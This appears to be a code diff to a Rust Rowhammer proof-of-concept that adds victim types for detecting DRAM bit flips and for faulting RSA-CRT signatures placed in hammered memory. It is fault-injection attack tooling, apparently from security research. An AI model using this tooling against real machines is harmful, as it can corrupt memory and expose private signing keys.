@@ -1,11 +1,12 @@
-use anyhow::{bail, Result};
-use bs_poc::forge::Hammerer;
-use bs_poc::memory::{LinuxPageMap, Memory, VirtToPhysResolver};
+use anyhow::{bail, Context, Result};
+use bs_poc::forge::{HammerVictim, Hammerer};
+use bs_poc::memory::{BitFlip, LinuxPageMap, Memory, VirtToPhysResolver};
 use bs_poc::util::{BlacksmithConfig, MemConfiguration};
 use bs_poc::victim::RsaCrt;
 use clap::Parser;
 use rand::rngs::StdRng;
-use std::ops::DerefMut;
+use std::fmt::Debug;
+use std::pin::Pin;
 
 /// Search for a pattern in a file and display the lines that contain it.
 #[derive(Debug, Parser)]
@@ -31,6 +32,68 @@ struct CliArgs {
 enum HammerMode {
     MemCheck,
     Rsa,
+}
+
+#[derive(Debug)]
+struct HammerVictimMemCheck<'a> {
+    mem_config: MemConfiguration,
+    memory: &'a Memory,
+    seed: Option<[u8; 32]>,
+    flips: Vec<BitFlip>,
+}
+
+impl<'a> HammerVictimMemCheck<'a> {
+    fn new(mem_config: MemConfiguration, memory: &'a Memory) -> Self {
+        HammerVictimMemCheck {
+            mem_config,
+            memory,
+            seed: None,
+            flips: vec![],
+        }
+    }
+}
+
+impl<'a> HammerVictim for HammerVictimMemCheck<'a> {
+    fn init(&mut self) {
+        let seed = rand::random();
+        self.memory.initialize::<StdRng>(seed);
+        self.seed = Some(seed);
+    }
+
+    fn check(&mut self) -> bool {
+        self.flips = self.memory.check::<StdRng>(
+            self.mem_config,
+            self.seed.with_context(|| "no seed").unwrap(),
+        );
+        !self.flips.is_empty()
+    }
+}
+
+#[derive(Debug)]
+struct HammerVictimRsa<'a> {
+    rsa: Pin<&'a mut RsaCrt>,
+}
+
+impl<'a> HammerVictimRsa<'a> {
+    fn new(memory: &'a Memory) -> Self {
+        let rng = rand::thread_rng();
+        let victim_offset = 1337;
+        let rsa = RsaCrt::new(rng, memory, victim_offset)
+            .with_context(|| "RsaCrt::new failed")
+            .unwrap();
+        HammerVictimRsa { rsa }
+    }
+}
+
+impl<'a> HammerVictim for HammerVictimRsa<'a> {
+    fn init(&mut self) {}
+    fn check(&mut self) -> bool {
+        let msg = b"hello world";
+        return match self.rsa.sign(msg) {
+            Ok(_) => false,
+            Err(_) => true,
+        };
+    }
 }
 
 #[macro_use]
@@ -62,8 +125,6 @@ fn main() -> Result<()> {
         Err(err) => warn!("Failed to determine physical address: {}", err),
     }
 
-    // check memory.start phys addr
-
     let config = BlacksmithConfig::from_jsonfile(&args.config)?;
     let mem_config =
         MemConfiguration::from_bitdefs(config.bank_bits, config.row_bits, config.col_bits);
@@ -73,41 +134,37 @@ fn main() -> Result<()> {
         args.pattern.clone(),
         memory.addr.clone(),
     )?;
+    let mut victim: Box<dyn HammerVictim> = match args.hammer_mode {
+        HammerMode::MemCheck => Box::new(HammerVictimMemCheck::new(mem_config, &memory)),
+        HammerMode::Rsa => Box::new(HammerVictimRsa::new(&memory)),
+    };
     info!("initialized hammerer");
-
-    let rng = rand::thread_rng();
-    let victim_offset = 1337;
-    let mut rsa_p = RsaCrt::new(rng, &memory, victim_offset)?;
-    let rsa = rsa_p.deref_mut();
-    let msg = b"hello world";
-    let sig = rsa.sign(msg)?;
-    let check = rsa.verify(msg, &sig);
-    unsafe {
-        assert_eq!(
-            rsa as *const RsaCrt as usize,
-            memory.addr.add(victim_offset) as usize
-        )
-    };
-    info!("signature test: {}", check);
     info!("start hammering");
-    let init = |_| {
-        let seed = rand::random();
-        memory.initialize::<StdRng>(seed);
-        seed
-    };
-    let check = |seed| memory.check::<StdRng>(mem_config, seed);
     loop {
-        let result = hammerer.hammer(init, check)?;
+        let result = hammerer.hammer(victim.as_mut())?;
         println!(
-            "Flipped at run {} after {} attempts with seed {:?} at {:?}",
-            result.run, result.attempt, result.state, result.result,
+            "Successful at run {} after {} attempts with victim {:?}",
+            result.run, result.attempt, victim,
         );
-        let virt_addrs: Vec<String> = result
-            .result
-            .iter()
-            .map(|bf| bf.dram_addr.to_virt(memory.addr, mem_config))
-            .map(|addr| format!("0x{:02X}", addr as usize))
-            .collect();
-        println!("Addresses with flips: {:?}", virt_addrs);
+        /*
+        match args.hammer_mode {
+            HammerMode::MemCheck => {
+                /*
+                let virt_addrs: Vec<String> = victim
+                    .flips
+                    .iter()
+                    .map(|bf| bf.dram_addr.to_virt(memory.addr, mem_config))
+                    .map(|addr| format!("0x{:02X}", addr as usize))
+                    .collect();
+                println!("Addresses with flips: {:?}", virt_addrs);
+                */
+                let mut victim = HammerModeMemCheck::new(mem_config, &memory);
+            }
+            HammerMode::Rsa => {
+                let mut victim = HammerModeRsa::new(&memory);
+                let result = hammerer.hammer(&mut victim)?;
+            }
+        };
+        */
     }
 }
